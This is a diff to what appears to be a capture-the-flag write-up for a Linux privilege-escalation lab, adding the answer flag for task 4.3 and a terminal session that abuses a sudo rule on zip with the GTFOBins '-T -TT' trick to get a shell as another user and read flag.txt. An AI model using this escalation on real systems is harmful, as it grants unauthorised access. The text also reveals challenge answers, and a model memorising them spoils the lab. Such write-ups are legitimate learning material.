@@ -661,7 +661,7 @@ dalia{4a94a7a7bb4a819a63a33979926c77dc}
 <p></p>
 
 <p>4.3. What is silvio's flag?<br>
-<code>______</code></p>
+<code>silvio{657b4d058c03ab9988875bc937f9c2ef}</code></p>
 
 ```bash
 dalia@linuxagency:~$ sudo -l
@@ -683,12 +683,28 @@ Sudoers entry:
     Options: !authenticate
     Commands:
 	/usr/bin/zip
-dalia@linuxagency:~$ 
+dalia@linuxagency:~$ TF=$(mktemp -u)
+dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 37%)
+$ whoami
+silvio
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+silvio@linuxagency:/home/dalia$ 
+silvio@linuxagency:/home/dalia$ cd ..
+silvio@linuxagency:/home$ cd silvio
+silvio@linuxagency:~$ ls
+examples.desktop  flag.txt
+silvio@linuxagency:~$ cat flag.txt
+silvio{657b4d058c03ab9988875bc937f9c2ef}
 ```
 
 <p>GTFObins</p>
 
 ![image](https://github.com/user-attachments/assets/68782721-173d-42e4-8de0-d93c2cd6b83c)
+
+![image](https://github.com/user-attachments/assets/d4d657fe-e509-4843-ad21-efb9290fdbb3)
+
+
 
 
 <p>4.4. What is reza's flag?<br>
